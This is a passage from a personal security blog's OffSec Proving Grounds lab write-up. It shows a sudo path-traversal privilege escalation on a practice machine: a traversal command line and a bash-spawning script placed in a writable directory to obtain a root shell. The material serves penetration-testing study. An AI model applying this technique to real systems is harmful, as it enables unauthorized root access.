class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/../../../../../../home/tanto/.cgi_bin/bin /tmp/<span class="k">*</span>
</pre></table></code></div></div><p>This means that the command tries to execute the file <code class="language-plaintext highlighter-rouge">/home/tanto/.cgi_bin/bin</code> as a command and the <code class="language-plaintext highlighter-rouge">/tmp/*</code> as an argument.</p><h4 id="root"><span class="me-2">Root</span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The command <code class="language-plaintext highlighter-rouge">bin</code> can be replaced with anything such that it will get executed. This can be done by using a shell script by the same name that can be created on the machine using <code class="language-plaintext highlighter-rouge">nano</code> as well as served via HTTP from attacker host to the <code class="language-plaintext highlighter-rouge">tanto</code> machine using <code class="language-plaintext highlighter-rouge">wget</code>. The file should contain the following →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c">##!/bin/bash</span>

/bin/bash
</pre></table></code></div></div><p>This can then be made world executable by using <code class="language-plaintext highlighter-rouge">chmod 777 bin</code> and then moved inside the <code class="language-plaintext highlighter-rouge">.cgi_bin</code> directory. <code class="language-plaintext highlighter-rouge">samurai</code> can then use the command with sudo to execute this file which would then grant a root shell and thus the root flag.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/offsec-proving-grounds/">OffSec Proving Grounds</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/offsec-proving-grounds/" class="post-tag no-text-decoration" >offsec-proving-grounds</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OffSec%20PG%20-%20Potato,%20PyExp,%20Sar,%20Seppukku%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set6%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OffSec%20PG%20-%20Potato,%20PyExp,%20Sar,%20Seppukku%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set6%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set6%2F&text=OffSec%20PG%20-%20Potato,%20PyExp,%20Sar,%20Seppukku%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Foscp-pg-set6%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/ai-rag/">Exploring RAG (Retrieval-Augmented Generation) and Talking to my Notes</a><li class="text-truncate lh-lg"> <a href="/blog/posts/cst-guide/">Containerized Security Toolkit - A Guide</a><li class="text-truncate lh-lg"> <a href="/blog/posts/newbified-effective-notes/">Effective Note-Taking</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-leantime/">Leantime in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/gha-docker-arch/">GitHub Actions & ARM Architecture</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/oscp-pg-set5/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</h4><div class="text-muted"><p>NoName Enumeration Machine IP → 192.168.225.15 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.225.15 OS Detection → os_info Port Service Other de...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set4/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Katana, Lampiao, Loly, Monitoring</h4><div class="text-muted"><p>Katana Enumeration Machine IP → 192.168.51.83 Network Scan Nmap scan → nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83 OS Detection → OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article><article class="col"> <a href="/blog/posts/oscp-pg-set3/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1639897200" data-df="ll" > Dec 19, 2021 </time><h4 class="pt-0 my-2">OffSec PG - Gaara, Geisha, Ha-Natraj, Inclusiveness</h4><div class="text-muted"><p>Gaara Enumeration Machine IP → 192.168.208.142 Network Scan Nmap scan → nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.208.142 OS Detection → OS: Linux; CPE: cpe:/o:linux:linux_kernel ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/oscp-pg-set5/" class="btn btn-outline-primary" aria-label="Older" ><p>OffSec PG - NoName, SoSimple, OnSystemShellDread, Photographer</p></a> <a href="/blog/posts/oscp-pg-set7/" class="btn btn-outline-primary" aria-label="Newer" ><p>OffSec PG - Shakabrah, Solistice, Sumo, Sunset Noontide</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/container/">container</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.29.0/dist/tocbot.min.js"></script> <script src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.min.js?baseurl=/blog&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener('DOMContentLoaded', function (event) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
